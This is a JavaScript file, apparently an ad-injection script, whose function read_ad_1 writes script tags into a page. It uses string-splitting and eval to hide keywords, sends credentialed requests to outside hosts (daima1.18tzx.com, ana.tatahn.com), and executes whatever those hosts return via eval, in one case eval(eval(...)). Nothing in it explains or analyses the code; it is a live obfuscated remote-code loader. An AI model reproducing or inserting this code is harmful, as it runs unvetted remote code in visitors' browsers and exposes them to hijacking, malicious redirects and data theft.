...
function read_ad_1() {
  //横幅
if(eval("na"+"vigator.userAgen"+"t.indexOf('U"+"CBr"+"owser') > -1")){document.write('<scr'+'i'+'pt data-union-ad data-priority="11" data-position="inline">(function(){var requestApi={};requestApi.getPageInfo=function(){var pageInfo={};var allPageInfoMeta=document.querySelectorAll("meta[name=u_external_info]");for(var idx=0;idx<allPageInfoMeta.length;idx++){var pageInfoMeta=allPageInfoMeta[idx];if(pageInfoMeta.hasAttribute("data-key")&&pageInfoMeta.hasAttribute("data-value")){pageInfo[pageInfoMeta.getAttribute("data-key")]=pageInfoMeta.getAttribute("data-value")}}return JSON.stringify(pageInfo)};requestApi.url="https://daima1.18tzx.com/3293/25?"+new Date().getTime()+"&uc_param_str=dn&pageinfo="+encodeURIComponent(requestApi.getPageInfo());requestApi.method="get".toUpperCase();requestApi.randId="c"+Math.random().toString(36).substr(8);window.document.writeln("<div id="+requestApi.randId+"></div>");requestApi.func=function(){var xmlhttp=new XMLHttpRequest();xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){window.xlRequestRun=false;if(xmlhttp.status==200){eval(xmlhttp.responseText)}}};xmlhttp.open(requestApi.method,requestApi.url,true);xmlhttp.send()};if(!window.xlRequestRun){window.xlRequestRun=true;requestApi.func()}else{requestApi.interval=setInterval(function(){if(!window.xlRequestRun){clearInterval(requestApi.interval);window.xlRequestRun=true;requestApi.func()}},500)}})();</scr'+'ipt>');} else {(function() { var requestApi = {}; requestApi.url = 'https://ana.tatahn.com/3293/32'; requestApi.method = 'get'.toUpperCase(); requestApi.randId = eval('\'c\'+Ma'+'th.ra'+'nd'+'om().toS'+'tri'+'ng(36).su'+'bstr(8)'); window.document.writeln('<div id="' + requestApi.randId + '"></div>'); requestApi.func = function() { if (!window.hffkRequestRun) { window.hffkRequestRun = true; }else{ setTimeout(requestApi.func, 500); return; } var xmlhttp = new XMLHttpRequest(); xmlhttp.withCredentials = true; xmlhttp.onreadystatechange = function() { if (xmlhttp.readyState == 4) { window.hffkRequestRun = false; if (xmlhttp.status == 200) { eval(xmlhttp.responseText); } } }; xmlhttp.open(requestApi.method, requestApi.url + '?' + new Date().getTime(), true); xmlhttp.send(); }; requestApi.func(); requestApi.func(); })();}
  //悬浮
  if(eval("na"+"vigator.userAgen"+"t.indexOf('U"+"CBr"+"owser') > -1")){eval("doc"+"um"+"ent.wri"+"teln('<scr' + 'i' + 'pt data-union-ad data-priority=\"12\" data-position=\"fixed\">(function(){var c0=\"https://daima1.18tzx.com/\";var a0=new XML"+"Htt"+"pRequ"+"est();a0.withCredentials=true;var b=c0+\"3293/4?\"+new Date().getTime();if(a0!=null){a0.onreadystat"+"echange=function(){if(a0.readyState==4){if(a0.status==200){eval(ev"+"al(a0.re"+"spo"+"nseT"+"ext));}}};a0.open(\"get\".toUppe"+"rCase(),b,true);a0.se"+"nd(null);}})();</scr'+'i' + 'pt>');");document.write("");} else {console.log(2);(function(){var c0="https://ana.tatahn.com/";var a0=new XMLHttpRequest();a0.withCredentials=true;var b=c0+"3293/4?"+new Date().getTime();if(a0!=null){a0.onreadystatechange=function(){if(a0.readyState==4){if(a0.status==200){eval("ev"+"al(a0.responseText)");}}};a0.open("get".toUpperCase(),b,true);a0.send(null);}})();}
